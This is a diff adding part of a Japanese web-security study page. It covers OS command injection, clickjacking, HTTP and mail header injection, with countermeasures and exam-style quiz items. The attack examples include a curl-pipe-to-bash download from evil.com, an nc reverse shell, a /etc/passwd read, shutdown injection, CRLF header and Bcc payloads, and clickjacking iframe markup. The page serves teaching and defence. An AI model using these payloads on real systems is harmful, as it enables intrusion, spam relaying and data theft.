+              </svg>
+            </div>
+            <div class="atk-role attacker">攻撃者</div>
+          </div>
+          <!-- ①入力 -->
+          <div class="atk-arrowcol">
+            <div class="atk-arrow-pair">
+              <div class="atk-label danger"><span class="atk-step-no danger">1</span>フォームにセミコロン注入</div>
+              <div class="atk-payload danger">りんご; shutdown -h now</div>
+              <div class="atk-line danger atk-arrow-r danger"></div>
+            </div>
+          </div>
+          <!-- Webアプリ -->
+          <div class="atk-node">
+            <div class="atk-icon webapp">
+              <svg width="34" height="34" viewBox="-18 -16 36 36" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M -14 16 Q -15 2 -4 0 L 4 0 Q 15 2 14 16 Z" fill="#eaf7f1" stroke="#155f44" stroke-width="1.3"/>
+                <circle cx="0" cy="-8" r="7" fill="#eaf7f1" stroke="#155f44" stroke-width="1.3"/>
+                <rect x="-8" y="-14" width="16" height="5" rx="0.5" fill="#155f44"/>
+              </svg>
+            </div>
+            <div class="atk-role webapp">在庫アプリ<small>system() 呼出</small></div>
+          </div>
+          <!-- ②シェル実行 -->
+          <div class="atk-arrowcol">
+            <div class="atk-arrow-pair">
+              <div class="atk-label warn"><span class="atk-step-no warn">2</span>シェルに渡す <span class="atk-excl" title="エスケープなし">!</span></div>
+              <div class="atk-payload warn">sh -c "check りんご; shutdown -h"</div>
+              <div class="atk-line warn atk-arrow-r warn"></div>
+            </div>
+          </div>
+          <!-- OS/シェル -->
+          <div class="atk-node">
+            <div class="atk-icon server">
+              <svg width="36" height="36" viewBox="-18 -18 36 36" stroke-linecap="round" stroke-linejoin="round">
+                <rect x="-16" y="-14" width="32" height="24" rx="2" fill="#1a2d3a" stroke="#0d1522" stroke-width="1.3"/>
+                <rect x="-14" y="-12" width="28" height="16" fill="#0d1522"/>
+                <text x="-12" y="-5" font-size="5" fill="#50c878" font-family="monospace">$</text>
+                <text x="-7" y="-5" font-size="4" fill="#50c878" font-family="monospace">_</text>
+                <rect x="-10" y="11" width="20" height="3" rx="0.5" fill="#333"/>
+              </svg>
+            </div>
+            <div class="atk-role server">OSシェル</div>
+          </div>
+        </div>
+        <!-- 分解表示 -->
+        <div class="atk-note" style="margin-top:14px;flex-direction:column;align-items:stretch;gap:6px">
+          <div style="font-size:11px;font-weight:700;color:#555;letter-spacing:.05em">シェルが実行する2命令:</div>
+          <div style="display:flex;gap:6px;flex-wrap:wrap">
+            <div class="atk-stepbox success" style="flex:1;min-width:160px"><strong>① 本来の命令:</strong> <code style="font-family:var(--mono)">check_stock "りんご"</code></div>
+            <div style="display:flex;align-items:center;font-family:var(--mono);font-size:18px;font-weight:900;color:#7a1818">;</div>
+            <div class="atk-stepbox danger" style="flex:1;min-width:160px"><strong>② 注入命令:</strong> <code style="font-family:var(--mono)">shutdown -h now</code> → 工場停止</div>
+          </div>
+        </div>
+      </div>
+      <div class="atk-caption">入力をそのままシェルコマンド文字列に連結すると、<code>;</code> <code>|</code> <code>&&</code> で任意コマンドが併発実行される</div>
+    </div>
+  </div>
+  <div class="detail-box examples">
+    <h4>シェル特殊文字と攻撃例</h4>
+    <div class="detail-code">
+<span class="c">// 脆弱なPHPコード</span>
+<span class="k">$host</span> <span class="v">= $_GET['host'];</span>
+<span class="ok">system</span>(<span class="v">"ping -c 1 " . $host</span>);
+
+<span class="c">// ① セミコロン：前後どちらも実行</span>
+<span class="ng">?host=google.com; cat /etc/passwd</span>
+<span class="c">// → ping -c 1 google.com; cat /etc/passwd</span>
+
+<span class="c">// ② パイプ：前の出力を後ろへ</span>
+<span class="ng">?host=google.com | id</span>
+<span class="c">// → uid=33(www-data) gid=33(www-data)</span>
+
+<span class="c">// ③ バッククォート：コマンド置換</span>
+<span class="ng">?host=`whoami`</span>
+
+<span class="c">// ④ &&：前が成功したら後を実行</span>
+<span class="ng">?host=localhost && curl https://evil.com/shell.sh | bash</span>
+
+<span class="c">// ⑤ $()：コマンド置換（bash）</span>
+<span class="ng">?host=$(nc -e /bin/bash evil.com 4444)  # リバースシェル</span>
+    </div>
+  </div>
+</div>
+
+<h3>SQLiとOSコマンドiの違い</h3>
+<div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:10px 0">
+  <div style="background:#fdf0f0;border:1px solid #e09090;border-radius:8px;padding:12px">
+    <div style="font-size:11px;font-weight:700;color:var(--danger);margin-bottom:6px">SQLインジェクション</div>
+    <div style="font-size:11.5px;color:#3a3d52;line-height:1.65">注入先：<strong>SQL構文（データベース）</strong><br>影響範囲：DBの読み書き・削除<br>被害例：個人情報漏洩、認証バイパス<br>悪用するもの：<code>' -- UNION SELECT</code></div>
+  </div>
+  <div style="background:#fde8e8;border:2px solid var(--danger);border-radius:8px;padding:12px">
+    <div style="font-size:11px;font-weight:700;color:var(--danger);margin-bottom:6px">OSコマンドインジェクション ← より危険</div>
+    <div style="font-size:11.5px;color:#3a3d52;line-height:1.65">注入先：<strong>シェル（OS）</strong><br>影響範囲：サーバ全体を制御可能<br>被害例：バックドア、全ファイル削除、他サーバへの攻撃<br>悪用するもの：<code>; | &amp;&amp; `$() ||</code></div>
+  </div>
+</div>
+
+<h3>対策</h3>
+<div class="steps">
+  <div class="step ok"><span class="sn" style="font-size:8px;width:48px;border-radius:3px;text-align:center">根本対策</span>
+    <div class="sb"><strong>OSコマンドを使わない設計（根本対策）：</strong>pingの代わりに<code>fsockopen()</code>（PHP）、<code>socket</code>モジュール（Python）等のライブラリAPIを使う。シェルを経由しないため根本的に安全。</div>
+  </div>
+  <div class="step ok"><span class="sn" style="font-size:8px;width:48px;border-radius:3px;text-align:center">引数分離</span>
+    <div class="sb"><strong>シェルを経由しない実行方式：</strong>
+    <div class="detail-code" style="margin:6px 0 0">
+<span class="c">// 危険：シェルを経由</span>
+<span class="ng">system("ping -c 1 " . $host);  // ; で追加コマンド可能</span>
+
+<span class="c">// 安全：引数を配列で渡す（PHP）</span>
+<span class="ok">$proc = proc_open</span>(<span class="v">['ping', '-c', '1', $host]</span>, ...);
+<span class="c">// シェルを介さないため ; | &amp;&amp; が無効化</span>
+
+<span class="c">// Python でも同様</span>
+<span class="ok">subprocess.run</span>(<span class="v">["ping", "-c", "1", host]</span>, shell=<span class="ng">False</span>)
+    </div></div>
+  </div>
+</div>
+</section>
+
+<!-- ================================================================ S10 クリックジャッキング ================================================================ -->
+<section class="section" id="s10">
+<div class="section-header"><span class="s-num gold-bg">10</span><h2>クリックジャッキング</h2></div>
+<p>正規サイトを<strong>透明なiframeで重ねて表示</strong>し、ユーザが意図しないクリックを正規サイトのボタンに対して行わせる視覚的詐欺攻撃。</p>
+
+<div class="detail-grid" style="padding:0;gap:14px">
+  <div class="detail-box analogy">
+    <h4>たとえ話</h4>
+    <p>喫茶店のメニュー（罠サイト）に「今日のおすすめ」と書かれたボタンがある。実はその上に透明なアクリル板（invisible iframe）が置かれていて、その位置には銀行の「全額送金確認」ボタンが重なっている。「おすすめ」をタップしたつもりが実際には<b>送金を確認してしまっている</b>。</p>
+    <!-- クリックジャッキング イラスト: 透明iframeがボタンの上に重なる -->
+    <div class="atk-scene">
+      <div class="atk-scene-inner">
+        <div class="atk-lane">
+          <!-- 被害者 -->
+          <div class="atk-node">
+            <div class="atk-icon victim">
+              <svg width="38" height="38" viewBox="-18 -15 36 36" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M -14 16 Q -15 2 -4 0 L 4 0 Q 15 2 14 16 Z" fill="#daeeff" stroke="#1a56cc" stroke-width="1.3"/>
+                <circle cx="0" cy="-8" r="8" fill="#daeeff" stroke="#1a56cc" stroke-width="1.3"/>
+              </svg>
+            </div>
+            <div class="atk-role victim">被害者<small>クリックする</small></div>
+          </div>
+          <!-- クリック方向 -->
+          <div class="atk-arrowcol">
+            <div class="atk-arrow-pair">
+              <div class="atk-label info"><span class="atk-step-no info">2</span>「おすすめ」ボタンをタップ</div>
+              <div class="atk-line info atk-arrow-r info"></div>
+            </div>
+          </div>
+          <!-- レイヤー重ね表示 -->
+          <div class="atk-click-stack">
+            <div class="atk-click-layer decoy">
+              <span class="atk-click-layer-title">z-index:0 表示層 (罠サイト)</span>
+              <div style="font-size:11.5px;color:#7a4208;font-weight:700;margin-top:2px;display:flex;align-items:center;gap:6px">
+                <svg width="14" height="14" viewBox="-9 -9 18 18" stroke-linecap="round" stroke-linejoin="round">
+                  <path d="M -6 -4 L 5 -4 L 5 4 Q 5 7 -1 7 Q -6 7 -6 4 Z" fill="#fff" stroke="#7a4208" stroke-width="1.2"/>
+                  <path d="M 5 -2 Q 8 -2 8 1 Q 8 4 5 4" fill="none" stroke="#7a4208" stroke-width="1.2"/>
+                  <path d="M -3 -7 Q -2 -5 -3 -3" fill="none" stroke="#b5821e" stroke-width="1"/>
+                  <path d="M 0 -7 Q 1 -5 0 -3" fill="none" stroke="#b5821e" stroke-width="1"/>
+                  <path d="M 3 -7 Q 4 -5 3 -3" fill="none" stroke="#b5821e" stroke-width="1"/>
+                </svg>
+                今日のおすすめコーヒー
+              </div>
+              <div class="atk-click-btn decoy">おすすめを見る</div>
+            </div>
+            <div class="atk-click-stack-glue">
+              <span style="font-family:var(--mono);background:#fff;padding:2px 6px;border-radius:3px;border:1px solid #e08080">opacity: 0.01</span>
+              <span>透明なので見えないが、クリックはこちらに吸われる</span>
+              <span class="atk-excl">!</span>
+            </div>
+            <div class="atk-click-layer hidden">
+              <span class="atk-click-layer-title">z-index:10 透明iframe (銀行)</span>
+              <div style="font-size:11.5px;color:#7a1818;font-weight:700;margin-top:2px;display:flex;align-items:center;gap:6px">
+                <svg width="14" height="14" viewBox="-9 -9 18 18" stroke-linecap="round" stroke-linejoin="round">
+                  <circle cx="-1" cy="1" r="6" fill="#f5c97a" stroke="#7a4208" stroke-width="1.2"/>
+                  <text x="-1" y="4" text-anchor="middle" font-size="8" fill="#7a4208" font-weight="700" font-family="serif">¥</text>
+                  <circle cx="3" cy="-2" r="5" fill="#ffd98a" stroke="#7a4208" stroke-width="1.2"/>
+                  <text x="3" y="1" text-anchor="middle" font-size="6.5" fill="#7a4208" font-weight="700" font-family="serif">¥</text>
+                </svg>
+                ABC銀行 送金確認
+              </div>
+              <div class="atk-click-btn real">全額送金を実行</div>
+            </div>
+          </div>
+          <!-- ③結果 -->
+          <div class="atk-arrowcol">
+            <div class="atk-arrow-pair">
+              <div class="atk-label danger"><span class="atk-step-no danger">3</span>実際は送金ボタンをクリック</div>
+              <div class="atk-line danger atk-arrow-r danger"></div>
+              <div class="atk-payload danger">POST /transfer 実行</div>
+            </div>
+          </div>
+          <!-- 銀行 -->
+          <div class="atk-node">
+            <div class="atk-icon server">
+              <svg width="38" height="38" viewBox="-20 -20 40 40" stroke-linecap="round" stroke-linejoin="round">
+                <rect x="-17" y="-16" width="34" height="10" rx="1.5" fill="#fff8e6" stroke="#b5821e" stroke-width="1.3"/>
+                <rect x="-17" y="-4" width="34" height="10" rx="1.5" fill="#fff8e6" stroke="#b5821e" stroke-width="1.3"/>
+                <rect x="-17" y="8" width="34" height="10" rx="1.5" fill="#fff8e6" stroke="#b5821e" stroke-width="1.3"/>
+                <circle cx="-12" cy="-11" r="1.3" fill="#b5821e"/>
+                <circle cx="-12" cy="1" r="1.3" fill="#b5821e"/>
+                <circle cx="-12" cy="13" r="1.3" fill="#b5821e"/>
+              </svg>
+            </div>
+            <div class="atk-role server">銀行サーバ</div>
+          </div>
+        </div>
+        <div class="atk-note danger" style="margin-top:14px">
+          <span class="atk-step-no danger" style="margin-top:1px">1</span>
+          <div><strong>事前準備：</strong>攻撃者が罠サイトに正規銀行を透明iframeで重ねて埋め込む。見える層はエサのボタン、実際の受け手は裏の送金ボタン。</div>
+        </div>
+      </div>
+      <div class="atk-caption">見えているUIと実際にクリックされるUIが異なる → ユーザは意図せず銀行の送金ボタンを押す</div>
+    </div>
+  </div>
+  <div class="detail-box mechanism">
+    <h4>攻撃の仕組み（HTML）</h4>
+    <div class="detail-code" style="font-size:10px">
+<span class="c">&lt;!-- 罠サイト --&gt;</span>
+<span class="v">&lt;style&gt;</span>
+<span class="w">  .decoy-button</span> { position: absolute; top: 200px; left: 100px; z-index: 1; }
+<span class="w">  .victim-iframe</span> {
+    position: absolute; top: 0; left: 0;
+    width: 100%; height: 100%;
+    <span class="ng">opacity: 0;</span>  <span class="c">/* 完全透明！ */</span>
+    z-index: 2;  <span class="c">/* 前面に配置 */</span>
+  }
+<span class="v">&lt;/style&gt;</span>
+
+<span class="c">&lt;!-- ユーザに見えるコンテンツ --&gt;</span>
+<span class="v">&lt;button class="decoy-button"&gt;今日のおすすめをチェック！&lt;/button&gt;</span>
+
+<span class="c">&lt;!-- 透明に重ねた正規サイト --&gt;</span>
+<span class="ng">&lt;iframe class="victim-iframe" src="https://bank.jp/transfer-confirm"&gt;&lt;/iframe&gt;</span>
+    </div>
+  </div>
+</div>
+
+<h3>対策</h3>
+<div class="steps">
+  <div class="step ok"><span class="sn" style="font-size:8px;width:48px;border-radius:3px;text-align:center">X-Frame-Options</span>
+    <div class="sb"><strong>X-Frame-Options ヘッダ（最重要）：</strong>自サイトがiframeに読み込まれることを禁止する。設定するのは<strong>守られる側（正規サイト）</strong>のサーバ。
+    <div class="detail-code" style="margin:6px 0 0">
+<span class="c"># DENY: すべてのiframe埋め込みを拒否</span>
+<span class="ok">X-Frame-Options: DENY</span>
+
+<span class="c"># SAMEORIGIN: 同一オリジンのみ許可</span>
+<span class="ok">X-Frame-Options: SAMEORIGIN</span>
+
+<span class="c"># 新しい方式（CSP）</span>
+<span class="ok">Content-Security-Policy: frame-ancestors 'none'</span>
+    </div></div>
+  </div>
+</div>
+</section>
+
+<!-- ================================================================ S11 HTTPヘッダインジェクション ================================================================ -->
+<section class="section" id="s11">
+<div class="section-header"><span class="s-num green-bg">11</span><h2>HTTPヘッダインジェクション</h2></div>
+<p>HTTPレスポンスヘッダに<strong>CRLF（<code>\r\n</code>）を注入</strong>し、任意のヘッダを追加・レスポンスを分割する攻撃。HTTPレスポンス分割攻撃とも呼ばれる。</p>
+
+<div class="detail-grid" style="padding:0;gap:14px">
+  <div class="detail-box analogy">
+    <h4>たとえ話</h4>
+    <p>郵便局（サーバ）が配達票（HTTPレスポンスヘッダ）を作成するとき、受取人名（ユーザ入力）をそのまま書き込む。攻撃者が「<b>田中様←改行→差出人変更：悪意サーバ←改行←改行→偽コンテンツ</b>」と入力すると、改行以降が新しいヘッダやボディとして解釈されてしまう。</p>
+    <!-- HTTPヘッダi イラスト: 郵便局が配達票にCRLFを書き込んでしまう -->
+    <div class="atk-scene">
+      <div class="atk-scene-inner">
+        <div class="atk-lane">
+          <!-- 攻撃者 -->
+          <div class="atk-node">
+            <div class="atk-icon attacker">
+              <svg width="38" height="38" viewBox="-16 -20 32 38" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M -14 14 L 14 14 L 13 17 L -13 17 Z" fill="#ffd0d0" stroke="#7a1818" stroke-width="1.3"/>
+                <rect x="-12" y="5" width="24" height="9" rx="1" fill="#ffe8e8" stroke="#7a1818" stroke-width="1.3"/>
+                <text x="0" y="12" text-anchor="middle" font-size="6" fill="#7a1818" font-family="monospace">&lt;/&gt;</text>
+                <path d="M -10 5 Q -12 -1 -4 -2 L 4 -2 Q 12 -1 10 5" fill="#ffe8e8" stroke="#7a1818" stroke-width="1.3"/>
+                <circle cx="0" cy="-9" r="7" fill="#ffd0d0" stroke="#7a1818" stroke-width="1.3"/>
+                <path d="M -5 -14 L -6 -20 Q -3 -17 -3 -15 Z" fill="#7a1818"/>
+                <path d="M 5 -14 L 6 -20 Q 3 -17 3 -15 Z" fill="#7a1818"/>
+                <rect x="-6" y="-11" width="4.5" height="2.8" rx="0.6" fill="#7a1818"/>
+                <rect x="1.5" y="-11" width="4.5" height="2.8" rx="0.6" fill="#7a1818"/>
+                <line x1="-1.5" y1="-9.7" x2="1.5" y2="-9.7" stroke="#7a1818" stroke-width="0.9"/>
+                <path d="M -3 -6 Q 0 -4 3 -6" fill="none" stroke="#7a1818" stroke-width="1.1"/>
+                <path d="M -1.5 -6 L -1 -4.5 L -0.5 -6 Z" fill="#7a1818"/>
+                <path d="M 0.5 -6 L 1 -4.5 L 1.5 -6 Z" fill="#7a1818"/>
+              </svg>
+            </div>
+            <div class="atk-role attacker">攻撃者</div>
+          </div>
+          <!-- ①入力(CRLF込み) -->
+          <div class="atk-arrowcol">
+            <div class="atk-arrow-pair">
+              <div class="atk-label danger"><span class="atk-step-no danger">1</span>CRLFを含む入力を送信</div>
+              <div class="atk-payload danger">name=太郎%0D%0ASet-Cookie:evil</div>
+              <div class="atk-line danger atk-arrow-r danger"></div>
+            </div>
+          </div>
+          <!-- Webサーバ -->
+          <div class="atk-node">
+            <div class="atk-icon server" style="position:relative">
+              <svg width="38" height="38" viewBox="-20 -20 40 40" stroke-linecap="round" stroke-linejoin="round">
+                <rect x="-17" y="-16" width="34" height="10" rx="1.5" fill="#fff8e6" stroke="#b5821e" stroke-width="1.3"/>
+                <rect x="-17" y="-4" width="34" height="10" rx="1.5" fill="#fff8e6" stroke="#b5821e" stroke-width="1.3"/>
+                <rect x="-17" y="8" width="34" height="10" rx="1.5" fill="#fff8e6" stroke="#b5821e" stroke-width="1.3"/>
+                <circle cx="-12" cy="-11" r="1.3" fill="#b5821e"/>
+                <circle cx="-12" cy="1" r="1.3" fill="#b5821e"/>
+                <circle cx="-12" cy="13" r="1.3" fill="#b5821e"/>
+              </svg>
+              <span class="atk-excl" style="position:absolute;top:-6px;right:-6px" title="改行を検証しない">!</span>
+            </div>
+            <div class="atk-role server">Web サーバ<small>レスポンス組立</small></div>
+          </div>
+          <!-- ②レスポンス -->
+          <div class="atk-arrowcol">
+            <div class="atk-arrow-pair">
+              <div class="atk-label warn"><span class="atk-step-no warn">2</span>汚染された HTTPレスポンス</div>
+              <div class="atk-line warn atk-arrow-r warn"></div>
+            </div>
+          </div>
+          <!-- 被害者 -->
+          <div class="atk-node">
+            <div class="atk-icon victim">
+              <svg width="38" height="38" viewBox="-18 -15 36 36" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M -14 16 Q -15 2 -4 0 L 4 0 Q 15 2 14 16 Z" fill="#daeeff" stroke="#1a56cc" stroke-width="1.3"/>
+                <circle cx="0" cy="-8" r="8" fill="#daeeff" stroke="#1a56cc" stroke-width="1.3"/>
+              </svg>
+            </div>
+            <div class="atk-role victim">被害者ブラウザ</div>
+          </div>
+        </div>
+        <!-- レスポンスの内訳（ヘッダ汚染） -->
+        <div class="atk-note" style="margin-top:14px;background:#1a2d3a;border-left-color:#7a1818;color:#fff;font-family:var(--mono);padding:12px 15px;flex-direction:column;align-items:stretch;gap:2px">
+          <div style="font-size:10px;color:#50c878;margin-bottom:4px;font-family:var(--sans);font-weight:700">生成されたHTTPレスポンス:</div>
+          <div style="font-size:10.5px;color:#aaa">HTTP/1.1 302 Found</div>
+          <div style="font-size:10.5px;color:#aaa">Location: /page?name=太郎</div>
+          <div style="font-size:10.5px;color:#ff7070;background:rgba(122,24,24,.3);padding:2px 4px;border-radius:2px;margin-top:2px">Set-Cookie: evil  ← CRLF で注入されたヘッダ <span class="atk-excl" style="font-family:var(--sans);vertical-align:middle">!</span></div>
+          <div style="font-size:10.5px;color:#ff7070;background:rgba(122,24,24,.3);padding:2px 4px;border-radius:2px;margin-top:2px">Content-Length: 0</div>
+        </div>
+      </div>
+      <div class="atk-caption">入力の改行文字(<code>\r\n</code>)がそのままレスポンスヘッダに出力されると、任意ヘッダ注入やレスポンス分割が成立する</div>
+    </div>
+  </div>
+  <div class="detail-box examples">
+    <h4>具体的な攻撃例</h4>
+    <div class="detail-code">
+<span class="c">// 脆弱なリダイレクト処理</span>
+<span class="c">// ?lang=ja → Location: /page?lang=ja</span>
+
+<span class="c">// 攻撃入力（CRLFを含む）</span>
+<span class="ng">?lang=ja%0d%0aSet-Cookie%3A+session%3Dhacked</span>
+<span class="c">// %0d%0a = CR LF（改行）  %3A = :  %3D = =</span>
+
+<span class="c">// 生成されるHTTPレスポンス（危険）</span>
+<span class="v">HTTP/1.1 302 Found</span>
+<span class="v">Location: /page?lang=ja</span>
+<span class="ng">Set-Cookie: session=hacked</span>  <span class="c">← 注入されたヘッダ</span>
+
+<span class="c">// レスポンス分割（より深刻）</span>
+<span class="ng">?lang=ja%0d%0a%0d%0a&lt;html&gt;偽ページ&lt;/html&gt;</span>
+<span class="c">// 空行（CRLF×2）の後はボディとして解釈 → 偽ページ配信</span>
+    </div>
+  </div>
+</div>
+
+<h3>対策</h3>
+<div class="steps">
+  <div class="step ok"><span class="sn" style="font-size:8px;width:48px;border-radius:3px;text-align:center">CRLF除去</span>
+    <div class="sb"><strong>改行コード（CR・LF）の除去：</strong>ユーザ入力からヘッダに使う値のCR（<code>\r</code> / <code>%0d</code>）とLF（<code>\n</code> / <code>%0a</code>）を除去。フレームワークの安全なリダイレクトメソッドを使うことで多くの場合自動的に対策される。</div>
+  </div>
+</div>
+</section>
+
+<!-- ================================================================ S12 メールヘッダインジェクション ================================================================ -->
+<section class="section" id="s12">
+<div class="section-header"><span class="s-num green-bg">12</span><h2>メールヘッダインジェクション</h2></div>
+<p>メール送信フォームの入力値に<strong>CRLFを注入</strong>し、BCC等のヘッダを追加してスパムメールの踏み台にする攻撃。正規ドメインからのスパムとなりSPFを通過しやすい。</p>
+
+<div class="detail-grid" style="padding:0;gap:14px">
+  <div class="detail-box examples">
+    <h4>攻撃例</h4>
+    <div class="detail-code">
+<span class="c">// お問い合わせフォームの「件名」に注入</span>
+<span class="ng">製品について\r\nBcc: target1@evil.com,target2@evil.com\r\n</span>
+
+<span class="c">// 生成されるメール</span>
+<span class="v">From: support@legitimate-company.com</span>
+<span class="v">To: info@legitimate-company.com</span>
+<span class="v">Subject: 製品について</span>
+<span class="ng">Bcc: target1@evil.com,target2@evil.com</span> <span class="c">← 注入</span>
+
+<span class="c">// 「From」を偽装してなりすまし送信</span>
+<span class="ng">製品について\r\nFrom: president@bank.jp\r\n</span>
+<span class="c">// → 銀行社長からの偽メールとして送信</span>
+    </div>
+  </div>
+  <div class="detail-box defense">
+    <h4>HTTPヘッダiとの比較 / 対策</h4>
+    <div style="margin-bottom:10px">
+      <div style="font-size:10.5px;color:#3a3d52;line-height:1.65">
+        <strong>共通点：</strong>どちらもCRLFの注入が手法<br>
+        <strong>違い：</strong>HTTPヘッダiはWebサーバのレスポンスヘッダを改ざん、メールヘッダiはメール送信時のヘッダを改ざん
+      </div>
+    </div>
+    <span class="counter-tag">CRLFの除去（共通対策）</span>
+    <span class="counter-tag">To/Fromを固定値にする</span>
+    <div class="detail-code" style="margin:8px 0 0">
+<span class="c">// PHP（mb_send_mail使用時）</span>
+<span class="ok">$subject</span> = <span class="v">preg_replace('/\r|\n/', '', $_POST['subject']);</span>
+<span class="c">// CRとLFを除去してからヘッダに使用</span>
+
+<span class="c">// PHPMailer等のライブラリを使うと自動対策</span>
+<span class="ok">$mail = new PHPMailer(true);</span>
+    </div>
+  </div>
+</div>
+</section>
+
+<!-- ================================================================ S13 練習問題 ================================================================ -->
+<section class="section" id="s13">
+<div class="section-header"><span class="s-num gold-bg">13</span><h2>過去問スタイル 練習問題</h2></div>
+
+<div class="quiz-wrap">
+
+<div class="quiz" id="q1">
+<div class="quiz-q"><span class="quiz-qn">Q1</span>SQLインジェクション対策として最も根本的なものはどれか。</div>
+<div class="quiz-opts">
+<button class="quiz-opt" onclick="answer('q1','a','b')">ア. 入力値に含まれるHTMLタグを除去するサニタイズ処理を行う。</button>
+<button class="quiz-opt" onclick="answer('q1','b','b')">イ. プリペアドステートメントを使用してSQL文の構造とデータを分離する。</button>
+<button class="quiz-opt" onclick="answer('q1','c','b')">ウ. CookieにHttpOnly属性を付与する。</button>
+<button class="quiz-opt" onclick="answer('q1','d','b')">エ. X-Frame-Optionsヘッダを設定する。</button>
+</div>
+<div class="quiz-exp" id="q1-exp"><strong>正解：イ</strong><br>プリペアドステートメントはSQL文の構造とデータを完全に分離するため、入力にSQL文を混入されても命令として解釈されない根本的な対策。ア=XSS対策（HTMLエスケープが正確）、ウ=XSS経由のCookie窃取対策、エ=クリックジャッキング対策。</div>
+</div>
+
+<div class="quiz" id="q2">
+<div class="quiz-q"><span class="quiz-qn">Q2</span>CSRFとSSRFを比較した説明として最も適切なものはどれか。</div>
+<div class="quiz-opts">
+<button class="quiz-opt" onclick="answer('q2','a','c')">ア. CSRFはサーバ側からリクエストを発行させ、SSRFはクライアント側からリクエストを発行させる。</button>
+<button class="quiz-opt" onclick="answer('q2','b','c')">イ. CSRFとSSRFはどちらもSQLを注入する攻撃の一種である。</button>
+<button class="quiz-opt" onclick="answer('q2','c','c')">ウ. CSRFはログイン中のユーザのブラウザ（クライアント）から正規サービスへ偽リクエストを送信させ、SSRFはWebアプリ（サーバ）側から内部ネットワークへリクエストを発行させる。</button>
+<button class="quiz-opt" onclick="answer('q2','d','c')">エ. CSRFはWebサーバのファイルへの不正アクセスを目的とし、SSRFはCookieの窃取を目的とする。</button>
+</div>
+<div class="quiz-exp" id="q2-exp"><strong>正解：ウ</strong><br>CSRF（Cross-Site）=クライアント（ユーザのブラウザ）が偽リクエストを正規サーバへ送信。SSRF（Server-Side）=Webアプリ（サーバ）が踏み台となり内部ネットワークへリクエストを発行。C=Client側から、S=Server側から、と覚える。</div>
+</div>
+
+<div class="quiz" id="q3">
+<div class="quiz-q"><span class="quiz-qn">Q3</span>セッションフィクセーション攻撃への最も重要な対策はどれか。</div>
+<div class="quiz-opts">
+<button class="quiz-opt" onclick="answer('q3','a','d')">ア. CookieにSecure属性を付与してHTTPS通信時のみCookieを送信する。</button>
+<button class="quiz-opt" onclick="answer('q3','b','d')">イ. CookieにHttpOnly属性を付与してJavaScriptからの読み取りを禁止する。</button>
+<button class="quiz-opt" onclick="answer('q3','c','d')">ウ. CSRFトークンをフォームに埋め込んでサーバ側で検証する。</button>
+<button class="quiz-opt" onclick="answer('q3','d','d')">エ. 認証成功時に新しいセッションIDを発行し直す。</button>
+</div>
+<div class="quiz-exp" id="q3-exp"><strong>正解：エ</strong><br>セッションフィクセーションは「ログイン前に攻撃者が固定したセッションIDをユーザに使わせる」攻撃。認証成功時に新しいセッションIDを発行し直すことで、事前に固定されたIDを無効化できる根本対策。ア・イはセッションハイジャック対策（盗まれにくくする）、ウはCSRF対策。</div>
+</div>
+
+<div class="quiz" id="q4">
+<div class="quiz-q"><span class="quiz-qn">Q4</span>バッファオーバーフロー対策として、バッファとリターンアドレスの間にランダムな値を配置し、関数リターン前にその値が書き換えられていないかを検証する手法はどれか。</div>
+<div class="quiz-opts">
+<button class="quiz-opt" onclick="answer('q4','a','b')">ア. DEP/NX（Data Execution Prevention）</button>
+<button class="quiz-opt" onclick="answer('q4','b','b')">イ. スタックカナリア</button>
+<button class="quiz-opt" onclick="answer('q4','c','b')">ウ. ASLR（Address Space Layout Randomization）</button>
+<button class="quiz-opt" onclick="answer('q4','d','b')">エ. CSRF トークン</button>
+</div>
+<div class="quiz-exp" id="q4-exp"><strong>正解：イ</strong><br>スタックカナリア（Stack Canary）はバッファとリターンアドレスの間にランダムなカナリア値を「番犬」として配置し、関数リターン時に値が書き換えられていないかを検証するBOF対策。<br>ア=データ領域の実行不可設定（シェルコードの実行を防ぐ）、ウ=メモリ配置のランダム化（アドレス予測を困難に）、エ=CSRF攻撃への対策（無関係）。</div>
+</div>
+
+<div class="quiz" id="q5">
+<div class="quiz-q"><span class="quiz-qn">Q5</span>OSコマンドインジェクション対策として最も根本的なものはどれか。</div>
+<div class="quiz-opts">
+<button class="quiz-opt" onclick="answer('q5','a','c')">ア. 入力値に含まれるHTMLタグを除去する。</button>
+<button class="quiz-opt" onclick="answer('q5','b','c')">イ. 入力値に含まれるCRLFを除去する。</button>
+<button class="quiz-opt" onclick="answer('q5','c','c')">ウ. OSコマンドを呼び出す処理自体を避け、やむを得ない場合はシェルを経由しない実行方式（引数を配列で渡す）を使用する。</button>
+<button class="quiz-opt" onclick="answer('q5','d','c')">エ. プリペアドステートメントを使用する。</button>
+</div>
+<div class="quiz-exp" id="q5-exp"><strong>正解：ウ</strong><br>OSコマンドインジェクションの根本対策はOSコマンドをそもそも使わない設計。必要な場合は<code>subprocess.run(["ping", "-c", "1", host], shell=False)</code>のように引数を配列で渡すことでシェルを介さず、<code>;</code>や<code>|</code>等の特殊文字が区切り記号として解釈されなくなる。ア=XSS対策、イ=ヘッダインジェクション対策、エ=SQLインジェクション対策。</div>
+</div>
+
+<div class="quiz" id="q6">
+<div class="quiz-q"><span class="quiz-qn">Q6</span>クリックジャッキング攻撃を防ぐためにWebサーバ（守られる側）が設定すべきHTTPレスポンスヘッダはどれか。</div>
+<div class="quiz-opts">
+<button class="quiz-opt" onclick="answer('q6','a','b')">ア. Content-Type</button>
+<button class="quiz-opt" onclick="answer('q6','b','b')">イ. X-Frame-Options</button>
+<button class="quiz-opt" onclick="answer('q6','c','b')">ウ. Authorization</button>
+<button class="quiz-opt" onclick="answer('q6','d','b')">エ. Set-Cookie</button>
+</div>
+<div class="quiz-exp" id="q6-exp"><strong>正解：イ</strong><br>X-Frame-Optionsは自サイトがiframe等のフレームに読み込まれることを制御するHTTPレスポンスヘッダ。<code>X-Frame-Options: DENY</code>で全iframeを拒否、<code>SAMEORIGIN</code>で同一オリジンのみ許可。クリックジャッキングはiframeで正規サイトを重ねる攻撃なので、これを防ぐことで根本対策となる。</div>
+</div>
+
+<div class="quiz" id="q7">
+<div class="quiz-q"><span class="quiz-qn">Q7</span>ディレクトリトラバーサル攻撃において「../」が意味するものとして正しいものはどれか。</div>
+<div class="quiz-opts">
+<button class="quiz-opt" onclick="answer('q7','a','b')">ア. SQLのコメント記号で後続のSQL文を無効化する。</button>
